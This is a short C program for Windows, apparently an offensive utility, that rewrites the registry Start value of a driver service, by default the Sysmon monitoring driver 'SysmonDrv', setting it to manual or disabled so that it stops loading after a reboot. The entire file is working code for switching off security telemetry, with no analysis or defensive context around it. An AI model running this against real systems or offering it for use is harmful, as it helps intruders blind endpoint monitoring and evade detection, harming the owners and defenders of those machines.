#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
    const char *driver = argc > 1 ? argv[1] : "SysmonDrv";
    DWORD newStart = 3;

    if (argc > 2) {
        newStart = (DWORD)atoi(argv[2]);
        if (newStart > 4) {
            printf("[-] Invalid Start value (0=Boot, 1=System, 2=Auto, 3=Manual, 4=Disabled)\n");
            return 1;
        }
    }

    char subKey[512];
    _snprintf(subKey, sizeof(subKey), "SYSTEM\\CurrentControlSet\\Services\\%s", driver);

    printf("[*] Target: HKLM\\%s\n", subKey);

    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ | KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("[-] Failed to open key (error %ld)\n", rc);
        return 1;
    }

    DWORD oldStart = 0, sz = sizeof(oldStart);
    if (RegQueryValueExA(hKey, "Start", NULL, NULL, (BYTE *)&oldStart, &sz) == ERROR_SUCCESS)
        printf("[*] Current Start value: %lu\n", oldStart);

    rc = RegSetValueExA(hKey, "Start", 0, REG_DWORD, (const BYTE *)&newStart, sizeof(newStart));
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS) {
        printf("[-] Failed to set value (error %ld)\n", rc);
        return 1;
    }

    const char *names[] = {"Boot", "System", "Auto", "Manual", "Disabled"};
    printf("[+] Start changed: %lu (%s) -> %lu (%s)\n",
           oldStart, oldStart <= 4 ? names[oldStart] : "?",
           newStart, names[newStart]);
    printf("[*] Reboot required for changes to take effect\n");
    return 0;
}
